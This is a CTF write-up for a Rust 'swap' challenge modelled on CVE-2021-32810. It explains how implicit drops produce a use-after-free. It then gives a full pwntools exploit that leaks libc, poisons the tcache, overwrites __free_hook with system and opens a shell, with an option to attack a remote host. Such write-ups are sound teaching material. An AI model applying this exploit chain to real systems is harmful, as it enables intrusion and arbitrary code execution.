# Drop

## vulnerability

The basic idea is from [CVE-2021-32810](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32810).
This CVE is a good example to illustrate several kinds of implicit `drop` in Rust. Firstly,
if an object with drop trait is duplicated by copying its raw pointer using read(), it will be dropped twice
at the end of its life cycle. Therefore, if the object contains pointers to other memory locations, these memory locations
will be freed twice (e.g., a String object has a pointer to its content, and the drop trait of String 
will free this pointer). Secondly, if an item of list is replaced, the original item will be dropped implicitly.

I simplified the scenario of CVE-2021-32810 to make it easier to exploit. The original vulnerability may require complex 
heap fengshui since it can only be triggered within a process of merge sort. After implementing the vulnerablity 
(i.e., the implicit drops mentioned above) in a `swap` function (see in the src/swap.rs), an implicit free occurs while 
invoking swap(list, index_a, index_b). As a result, there will be an UAF on list[index_b].

```rust
fn swap(list: &mut [Bytes], ia: usize, ib: usize){
    if ia == ib {
        return;
    }
    unsafe{
        let tmp = get_by_index(&list, ia as isize).read();
        list[ia] = list[ib].clone();
        list[ib] = tmp.clone();
    }
}
```
To simply explain the UAF: tmp is a copy of list[ia]. Since list[ia] is dropped while replaced by `list[ib].clone()`, tmp will point to a freed memory chunk. However, list[ib] is freed and replaced with `tmp.clone()`, thus pointing to the same freed chunk of tmp's.  Consequencely, editing list[ib] will lead to an UAF.  

Back to see the complete implementation of this challenge, the `swap` operation is wrapped inside a `bubble` operation, which swap items of a list one by one. An `edit` operation provides the capability of triggering UAF. And a `show` operation make it very easy to leak the required addresses. 

## Reversing
The reverse engineering task of rust binary is hard. However, since the sructure and the behavior of this challenge is quite clear, I think it will be easy to find the vulnerabilities by dynamical debugging.  

## Exploitation
Now we can easily imagine the exploitation:

1. Try to leak necessary address by `show`. We can use the implictly drop in swap to insert some chunks into unsorted bin, and leak the fd pointer. 
2. Tcache poisoning by leveraging UAF.
3. Editing __free_hook to system.

So the exploitation becomes like that:
```python
from pwn import *
import sys
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
# context.log_level = "debug"

"""
demonstrate a exploitable double-free
"""

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    io = remote("122.9.157.7", 50001)
else:
    io = process("./swap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def choice(ch):
    io.recvuntil("Your choice: \n")
    io.sendline(str(ch))

def add(content):
    choice(1)
    io.recvuntil("content of the new item: \n")
    io.sendline(content)

def edit(idx, content):
    choice(3)
    io.recvuntil("Index: \n")
    io.sendline(str(idx))
    io.recvuntil("new content: \n")
    io.sendline(content)

def swap(ia, ib):
    choice(4)
    io.recvuntil("Index A: \n") 
    io.sendline(str(ia))
    io.recvuntil("Index B: \n") 
    io.sendline(str(ib))

def show(idx):
    choice(2)
    io.recvuntil("Index: \n")
    io.sendline(str(idx))
    io.recvuntil("item: \n")
    return io.recvline()

def leak_first_addr(idx):
    return u64(show(idx)[:8])
    
def reverse_bubble(idx):
    choice(4)
    io.recvuntil("West/East? (0 is West and 1 is East)\n")
    io.sendline("0")
    io.recvuntil("Launching index: \n")
    io.sendline(str(idx))

def bubble(idx):
    choice(4)
    io.recvuntil("West/East? (0 is West and 1 is East)\n")
    io.sendline("1")
    io.recvuntil("Launching index: \n")
    io.sendline(str(idx))

for i in range(10):
    add("h"*0x100)

reverse_bubble(8)
# gdb.attach(io)
for i in range(10):
    success("addr: " + hex(leak_first_addr(i)))

# leak libc
offset = 0x1ecbe0
libc_base = leak_first_addr(2) - offset
libc.address = libc_base
success("libc_base: " + hex(libc_base))

# tcache poisoning
edit(3, p64(libc.sym['__free_hook'])+b"a"*0x90)
# got free hook

print()
for i in range(10):
    success("addr: " + hex(leak_first_addr(i)))

add("/bin/sh\0"+"a"*(0x100-8))
add(p64(libc.sym['system'])+b"a"*(0x100-8))
choice("/bin/sh\0")
# gdb.attach(io)
    
io.interactive()
```